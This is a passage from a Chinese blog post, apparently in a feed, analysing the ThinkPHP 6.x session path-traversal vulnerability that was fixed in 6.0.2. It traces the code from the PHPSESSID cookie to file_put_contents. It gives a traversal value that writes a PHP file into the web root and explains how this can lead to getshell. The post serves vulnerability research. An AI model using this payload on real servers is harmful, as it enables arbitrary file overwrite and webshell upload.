-其中增加了对参数<code>$id</code>的校验，<code>ctype_alnum</code>函数判断参数是否为字母或数字的组合</p>
-<h2 id="分析">分析</h2>
-<p>在<code>src-&gt;think-&gt;session-&gt;Store.php</code>中</p>
-<pre><code class="language-php">public function setId($id = null): void
-{
-    $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());
-}
-</code></pre>
-<p>找到Store.php中调用,找到save这个函数</p>
-<pre><code class="language-php">public function save(): void
-{
-    $this-&gt;clearFlashData();
-
-    $sessionId = $this-&gt;getId();
-
-    if (!empty($this-&gt;data)) {
-        $data = $this-&gt;serialize($this-&gt;data);
-
-        $this-&gt;handler-&gt;write($sessionId, $data);
-    } else {
-        $this-&gt;handler-&gt;delete($sessionId);
-    }
-    $this-&gt;init = false;
-}
-</code></pre>
-<p>具体传入<code>$this-&gt;handler-&gt;write()</code>，继续跟踪<code>handler</code>，发现在<code>__construct</code>中被初始化<br>
-全局搜索一下，看哪些接口<code>implement</code>了这个<code>SessionHandlerInterface</code><br>
-<img src="https://chriskalix.github.io/post-images/1592107766466.png" alt="" loading="lazy"><br>
-在<code>cache.php</code>和<code>file.php</code>中发现调用，由于<code>cache</code>中没有敏感操作的样子，直接看<code>file.php</code>,找到<code>write</code></p>
-<pre><code class="language-php">public function write(string $sessID, string $sessData): bool
-{
-    $filename = $this-&gt;getFileName($sessID, true);
-    $data     = $sessData;
-    if ($this-&gt;config['data_compress'] &amp;&amp; function_exists('gzcompress')) {
-        //数据压缩
-        $data = gzcompress($data, 3);
-    }
-    return $this-&gt;writeFile($filename, $data);
-}
-其中writeFile
-protected function writeFile($path, $content): bool
-{
-    return (bool) file_put_contents($path, $content, LOCK_EX);
-}
-</code></pre>
-<p>$sessID是可控的，那么看一下<code>getFileName</code>函数</p>
-<pre><code class="language-php">protected function getFileName(string $name, bool $auto = false): string
-{
-    if ($this-&gt;config['prefix']) {
-        // 使用子目录
-        $name = $this-&gt;config['prefix'] . DIRECTORY_SEPARATOR . 'sess_' . $name;
-    } else {
-        $name = 'sess_' . $name;
-    }
-    $filename = $this-&gt;config['path'] . $name;
-    $dir      = dirname($filename);
-    if ($auto &amp;&amp; !is_dir($dir)) {
-        try {
-            mkdir($dir, 0755, true);
-        } catch (\Exception $e) {
-            // 创建失败
-        }
-    }
-    return $filename;
-}
-</code></pre>
-<p>可以看到是直接拼接的，没有任何过滤方法，便直接调用file_put_contents了<br>
-现在从SetId往上，查找SetId的调用，通过全局搜索找到src-&gt;think-&gt;middleware的59行</p>
-<pre><code class="language-php">public function handle($request, Closure $next)
-{
-    // Session初始化
-    $varSessionId = $this-&gt;app-&gt;config-&gt;get('session.var_session_id');
-    $cookieName   = $this-&gt;session-&gt;getName();
-    if ($varSessionId &amp;&amp; $request-&gt;request($varSessionId)) {
-        $sessionId = $request-&gt;request($varSessionId);
-    } else {
-        $sessionId = $request-&gt;cookie($cookieName);
-    }
-    if ($sessionId) {
-        $this-&gt;session-&gt;setId($sessionId);
-    }
-    $this-&gt;session-&gt;init();
-    $request-&gt;withSession($this-&gt;session);
-    /** @var Response $response */
-    $response = $next($request);
-    $response-&gt;setSession($this-&gt;session);
-    $this-&gt;app-&gt;cookie-&gt;set($cookieName, $this-&gt;session-&gt;getId());
-    return $response;
-}
-</code></pre>
-<p>首先看初始化，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>v</mi><mi>a</mi><mi>r</mi><mi>S</mi><mi>e</mi><mi>s</mi><mi>s</mi><mi>i</mi><mi>o</mi><mi>n</mi><mi>I</mi><mi>d</mi><mi mathvariant="normal">由</mi><mi mathvariant="normal">于</mi><mi>s</mi><mi>e</mi><mi>s</mi><mi>s</mi><mi>i</mi><mi>o</mi><mi>n</mi><mi mathvariant="normal">.</mi><mi>v</mi><mi>a</mi><msub><mi>r</mi><mi>s</mi></msub><mi>e</mi><mi>s</mi><mi>s</mi><mi>i</mi><mi>o</mi><msub><mi>n</mi><mi>i</mi></msub><mi>d</mi><mi mathvariant="normal">没</mi><mi mathvariant="normal">找</mi><mi mathvariant="normal">到</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">默</mi><mi mathvariant="normal">认</mi><mi mathvariant="normal">为</mi><mi mathvariant="normal">空</mi><mi mathvariant="normal">值</mi><mi mathvariant="normal">。</mi></mrow><annotation encoding="application/x-tex">varSessionId由于session.var_session_id没找到，默认为空值。</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault">d</span><span class="mord cjk_fallback">由</span><span class="mord cjk_fallback">于</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord">.</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">a</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">d</span><span class="mord cjk_fallback">没</span><span class="mord cjk_fallback">找</span><span class="mord cjk_fallback">到</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">默</span><span class="mord cjk_fallback">认</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">空</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">。</span></span></span></span>cookieName中调用了session-&gt;getname();session的类型为Session。跟进找到src-&gt;think-&gt;session-&gt;Store.php下有getName函数，默认值为PHPSESSID<br>
-到这里$sessionId就走向了else分支，因此可控变量就是Cookie中的PHPSESSID</p>
-<h2 id="漏洞的发生">漏洞的发生</h2>
-<p>根据同事博客中的文章快速起了一个环境。在app/controller/index.php中写一个函数，将传入的变量写入session中，那么就会存在被getshell的风险<br>
-因为目前session可控，但是默认session路径在/runtime/session下，且有一个sess_的前缀。然鹅尝试/../../是可以穿越路径的，那么危害就扩大为文件覆盖<br>
-如果开发时导致session中的某一参数可控，如下所示：</p>
-<pre><code class="language-php">public function mytest()
-{
-    $username = $_GET['name'];
-    Session::set('username',$username);
-    return 'success';
-}
-</code></pre>
-<p>那么就有可能存在被getshell的风险</p>
-<h2 id="总结与危害">总结与危害</h2>
-<ol>
-<li>危害范围在thinkphp 6.x且小于6.0.2</li>
-<li>默认的危害就是任意文件上传，可能造成文件覆盖</li>
-<li>在开发不当所导致的情况下(及session中内容用户可控)，那么可能导致getshell</li>
-</ol>
-<p>验证方法：<br>
-将PHPSESSID改为<code>/../../../public/././././123.php</code>，如果访问123.php成果则证明漏洞存在</p>
-<p>6.0.2中的修复：<br>
-直接加上ctype_alnum了，只能是数字或者字母，就不会出现这样的问题</p>
-<h2 id="参考文章">参考文章</h2>
-<p>https://blog.csdn.net/q851579181q/article/details/104344999<br>
-https://xz.aliyun.com/t/7109</p>
 ]]></content>
     </entry>
 </feed>
